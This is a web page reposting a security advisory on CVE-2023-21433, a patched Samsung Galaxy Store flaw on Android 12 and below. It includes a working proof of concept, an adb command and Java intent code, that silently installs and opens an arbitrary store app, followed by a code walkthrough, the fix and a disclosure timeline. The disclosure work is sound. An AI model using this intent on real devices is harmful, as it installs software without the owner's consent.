<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung Galaxy Store Arbitrary Application Install | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung Galaxy Store Arbitrary Application Install" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Improper access control vulnerability in Galaxy Store prior to version 4.5.49.8 allows local attackers to install applications from Galaxy Store." />
<meta property="og:description" content="Improper access control vulnerability in Galaxy Store prior to version 4.5.49.8 allows local attackers to install applications from Galaxy Store." />
<link rel="canonical" href="https://maliciouserection.com/cves/2023-01-01_cve-2023-21433/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2023-01-01_cve-2023-21433/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung Galaxy Store Arbitrary Application Install" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-01T00:00:00+00:00","datePublished":"2023-01-01T00:00:00+00:00","description":"Improper access control vulnerability in Galaxy Store prior to version 4.5.49.8 allows local attackers to install applications from Galaxy Store.","headline":"Samsung Galaxy Store Arbitrary Application Install","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2023-01-01_cve-2023-21433/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2023-01-01_cve-2023-21433/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung Galaxy Store Arbitrary Application Install</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <h4 id="original-post-httpsresearchnccgroupcom20230120technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434">Original post: <a href="https://research.nccgroup.com/2023/01/20/technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434/">https://research.nccgroup.com/2023/01/20/technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store 4.5.44.1, other versions affected</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2023-21433</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Automatic Application Install</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary</h2>

<p>It was found that the Galaxy App Store has an exported activity which does not handle incoming intents in a safe manner. This allows other applications installed on the same Samsung device to automatically install any application available on the Galaxy App Store without the user’s knowledge.</p>

<p>It should be noted that due to the changes made to Android 13, this issue only affects Samsung devices that are running Android 12 and below.</p>

<h2 id="impact">Impact</h2>

<p>A pre-installed rouge application on a Samsung device running Android 12 or below can abuse this issue to install any application currently available on the Galaxy App Store.</p>

<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>

<p>The following adb command can be used to abuse this issue to automatically install the application “Pokemon Go”:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>am start -n com.sec.android.app.samsungapps/.detail.alleypopup.AlleyDetailActivity --es GUID com.nianticlabs.pokemongo.ares --ez directInstall true --ez directOpen true
</code></pre></div></div>

<p>Alternatively, the following Java code can be used to perform the same action:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
intent.setComponent(new ComponentName("com.sec.android.app.samsungapps", "com.sec.android.app.samsungapps.detail.alleypopup.AlleyDetailActivity"));
intent.putExtra("GUID", "com.nianticlabs.pokemongo.ares");
intent.putExtra("directInstall", true);
intent.putExtra("directOpen", true);
startActivity(intent);
</code></pre></div></div>

<h2 id="technical-walkthrough">Technical Walkthrough</h2>

<p>After executing the PoC, the activity <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.detail.alleypopup.AlleyDetailActivity</code> method <code class="language-plaintext highlighter-rouge">onCreate(bundle)</code> processes the incoming intent. As a part of this function, one of two methods will be executed depending on if the incoming intent contained a data property:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyDetailActivity {
...
public void onCreate(Bundle bundle) {
    ...
    Intent intent = getIntent();
    Uri data = intent.getData();
    ...
    if (data == null) {
        a(intent);
    } else {
        e();
    }
    ...
}
</code></pre></div></div>

<p>The PoC did not add a data property to the new intent, so the method <code class="language-plaintext highlighter-rouge">a(intent)</code> gets executed, while passing the calling intent as an argument. Within <code class="language-plaintext highlighter-rouge">a(intent)</code>, the intent and its extras are passed to class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.detail.alleypopup.AlleyBundleContainer</code> method <code class="language-plaintext highlighter-rouge">parseValues(bundle, intent)</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyDetailActivity {
...
public void a(Intent intent) {
    ...
    Bundle extras = intent.getExtras();
    AlleyBundleContainer bundleContainer = getBundleContainer();
    ...
    if (extras != null) {
        this.f = bundleContainer.parseValues(extras, intent);
    }
    ...
}
</code></pre></div></div>

<p>The method <code class="language-plaintext highlighter-rouge">parseValues(bundle, intent)</code> parses the intent extras and adds them to a Content object. Some of the important values include:</p>

<ul>
  <li>“GUID” = the package name of the application to be installed</li>
  <li>‘directInstall” = if the package should be automatically installed</li>
  <li>“directOpen” = if the application should be opened right after it is installed</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyBundleContainer {
...
public ContentDetailContainer parseValues(Bundle bundle, Intent intent) {
    Content content = new Content();
    String string = bundle.getString(“GUID”);
    content.setGUID(string);
    ...
    this.g = bundle.getBoolean(“directInstall”, false)
    this.h = bundle.getBoolean(“directOpen”, false)
    ...
    return content;
}
</code></pre></div></div>

<p>Later, since <code class="language-plaintext highlighter-rouge">directInstall</code> is set to true, the application will execute the method <code class="language-plaintext highlighter-rouge">J()</code> within the <code class="language-plaintext highlighter-rouge">AlleyDetailActivity</code> class. This method will then execute the method <code class="language-plaintext highlighter-rouge">b(AlleyDetailActivity)</code> within the class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.detail.alleypopup.b</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyDetailActivity {
...
public void J() {
    ...
    if (this.d == Constant_todo.AppType.APP_NOT_INSTALLED || this.d == Constant_todo.AppType.APP_UPDATABLE) {
        b.b(this);
    }
}
</code></pre></div></div>

<p>The method <code class="language-plaintext highlighter-rouge">b(AlleyDetailActivity)</code> will then setup a task to download and install the target application which was previously specified by the incoming intent. After the application is installed, since <code class="language-plaintext highlighter-rouge">directOpen</code> was set to “True”, the Galaxy App Store application will open the newly installed application.</p>

<h2 id="recommendation">Recommendation</h2>

<p>For Samsung devices running Android 12 or lower, Samsung has released an updated version of the Galaxy App Store (version 4.5.49.8). Users should open the Galaxy App Store on their phone, and if prompted, download and install the latest version.</p>

<p>This issue does not affect devices running Android 13. Users should still update their Galaxy App Store to the latest version to address potentially other issues.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>23/11/2022</td>
      <td>Samsung notified of vulnerability</td>
    </tr>
    <tr>
      <td>23/11/2022</td>
      <td>Samsung acknowledge receipt of report and a security analyst was assigned to analyze the report</td>
    </tr>
    <tr>
      <td>11/12/2022</td>
      <td>Samsung confirmed the vulnerability and rated it as a High risk</td>
    </tr>
    <tr>
      <td>01/01/2023</td>
      <td>Samsung has released Galaxy App Store version 4.5.49.8 and has publicly disclosed the issue</td>
    </tr>
  </tbody>
</table>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
